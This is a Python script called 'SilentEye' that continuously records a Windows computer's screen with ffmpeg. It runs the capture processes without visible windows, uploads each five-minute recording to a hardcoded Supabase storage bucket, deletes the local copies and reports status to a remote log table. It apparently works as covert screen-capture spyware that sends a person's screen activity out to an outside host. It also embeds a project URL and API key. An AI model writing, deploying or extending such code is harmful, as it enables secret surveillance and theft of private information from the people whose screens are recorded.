import subprocess, os, time, sys, datetime

# ================= YOUR CONFIG =================
SUPABASE_URL      = "https://jseelqffjglpgpsllkfz.supabase.co"
SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpzZWVscWZmamdscGdwc2xsa2Z6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUzNjU0ODIsImV4cCI6MjExMDk0MTQ4Mn0.ANOyQFDBKWaT-qOJbr0pXJ_ypsVAPE6kZlnNnj94G1A"
FRAMERATE         = 10
CHUNK_MINUTES     = 5
MAX_FAILS         = 3   # consecutive real ffmpeg errors before giving up
UPLOAD_RETRIES    = 3   # retry each upload this many times
# ===============================================

OUTPUT_DIR = r"C:\ProgramData\SilentEye\Captures"
SCRIPT_DIR = os.path.dirname(sys.argv[0])
LOG_FILE   = os.path.join(SCRIPT_DIR, "service_log.txt")

os.makedirs(OUTPUT_DIR, exist_ok=True)

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

def log(msg):
    stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line  = f"[{stamp}] {msg}"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line)

def send_supabase_log(status, message=""):
    url = f"{SUPABASE_URL}/rest/v1/recording_logs"
    headers = {
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "apikey":        SUPABASE_ANON_KEY,
        "Content-Type":  "application/json",
        "Prefer":        "return=minimal"
    }
    payload = {
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "status":    status,
        "message":   message
    }
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=10)
        if r.status_code not in (200, 201):
            log(f"Failed to send log: {r.status_code} {r.text}")
    except Exception as e:
        log(f"Could not reach Supabase: {e}")

def upload_to_supabase(filepath, filename):
    url = f"{SUPABASE_URL}/storage/v1/object/recordings/{filename}"
    headers = {
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type":  "application/octet-stream",
        "x-upsert":      "true"
    }
    for attempt in range(1, UPLOAD_RETRIES + 1):
        try:
            with open(filepath, "rb") as f:
                r = requests.post(url, headers=headers, data=f, timeout=120)
            if r.status_code in (200, 201):
                log(f"Uploaded {filename} ({os.path.getsize(filepath)/1024/1024:.1f} MB)")
                return True
            else:
                log(f"Upload attempt {attempt}/{UPLOAD_RETRIES} failed: {r.status_code} {r.text}")
        except Exception as e:
            log(f"Upload attempt {attempt}/{UPLOAD_RETRIES} error: {e}")
        if attempt < UPLOAD_RETRIES:
            log(f"Retrying upload in 15s...")
            time.sleep(15)
    return False

def find_ffmpeg():
    toolkit = r"C:\ProgramData\FB_Toolkit\ffmpeg.exe"
    if os.path.isfile(toolkit):
        return toolkit
    local = os.path.join(SCRIPT_DIR, "ffmpeg.exe")
    if os.path.isfile(local):
        return local
    for p in os.environ.get("PATH", "").split(os.pathsep):
        candidate = os.path.join(p, "ffmpeg.exe")
        if os.path.isfile(candidate):
            return candidate
    return None

# These codes = ddagrab lost display session (screen sleep / lock / monitor off)
# NOT real errors — display just isn't active right now
DDAGRAB_SLEEP_CODES = {3752568763, 4294967295}

def wait_for_display():
    """
    Screen is sleeping or locked. Probe every 30s with a 1-frame ddagrab test.
    Returns only when display is back and capturable.
    Logs once when sleep starts, once when display comes back.
    """
    ffmpeg_path = find_ffmpeg()
    probe_cmd = [
        ffmpeg_path,
        "-filter_complex", "ddagrab=0:draw_mouse=0:framerate=1,hwdownload,format=bgra,format=yuv420p",
        "-frames:v", "1",
        "-f", "null", "-"
    ]
    log("Display sleeping/locked — pausing capture, will auto-resume when display is back...")
    send_supabase_log("paused", "Display sleep detected, waiting for display to wake")

    sleep_start = time.time()
    while True:
        time.sleep(30)
        try:
            r = subprocess.run(
                probe_cmd,
                stderr=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                timeout=15,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            rc = r.returncode & 0xFFFFFFFF
            if rc == 0:
                # Display is back
                gone_minutes = int((time.time() - sleep_start) / 60)
                log(f"Display is back (was away {gone_minutes}m). Resuming capture.")
                send_supabase_log("resumed", f"Display woke after {gone_minutes}m, resuming")
                return
        except subprocess.TimeoutExpired:
            pass  # still sleeping, keep waiting
        except Exception:
            pass

def main_loop():
    ffmpeg_path = find_ffmpeg()
    if not ffmpeg_path:
        log("FFmpeg not found.")
        send_supabase_log("fatal", "FFmpeg not found")
        return

    log(f"Using ffmpeg: {ffmpeg_path}")
    log("Recorder started.")
    send_supabase_log("started", "SilentEye started on Computer 1")

    fails = 0
    while fails < MAX_FAILS:
        ts       = time.strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{ts}.mkv"
        out      = os.path.join(OUTPUT_DIR, filename)

        cmd = [
            ffmpeg_path,
            "-filter_complex", f"ddagrab=0:draw_mouse=1:framerate={FRAMERATE},hwdownload,format=bgra,format=yuv420p",
            "-c:v",        "libx264",
            "-preset",     "veryfast",
            "-crf",        "28",
            "-t",          str(CHUNK_MINUTES * 60),
            "-y",          out
        ]

        log(f"Starting chunk: {filename}")
        try:
            result = subprocess.run(
                cmd,
                stderr=subprocess.PIPE,
                stdout=subprocess.DEVNULL,
                check=False,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            stderr_full = result.stderr.decode(errors="replace").strip()
            rc = result.returncode & 0xFFFFFFFF
        except Exception as e:
            log(f"Subprocess error: {e}")
            stderr_full = str(e)
            rc = 1

        if rc != 0:
            if rc in DDAGRAB_SLEEP_CODES:
                # Screen went to sleep or locked mid-chunk — wait for it to come back
                wait_for_display()
                # fails counter untouched — this is not a real error
                continue
            else:
                # Real ffmpeg error
                log(f"FFmpeg exit code {rc}. Error:")
                log(stderr_full[:1000])
                send_supabase_log("error", f"FFmpeg error {rc}: {stderr_full[:300]}")
                fails += 1
                time.sleep(30)
                continue

        fails = 0

        if os.path.exists(out) and os.path.getsize(out) > 0:
            success = upload_to_supabase(out, filename)
            try:
                os.remove(out)
            except Exception:
                pass
            if not success:
                log(f"All {UPLOAD_RETRIES} upload attempts failed; local file deleted.")
                send_supabase_log("error", f"Upload failed after {UPLOAD_RETRIES} attempts: {filename}")
        else:
            log("FFmpeg ran but produced no file. Stderr: " + stderr_full[:300])
            send_supabase_log("error", "No output file: " + stderr_full[:300])
            time.sleep(30)

    log("Max consecutive failures reached. Stopping.")
    send_supabase_log("fatal", "Max failures reached")

if __name__ == "__main__":
    try:
        main_loop()
    except Exception as e:
        log(f"FATAL: {e}")
        send_supabase_log("fatal", str(e))
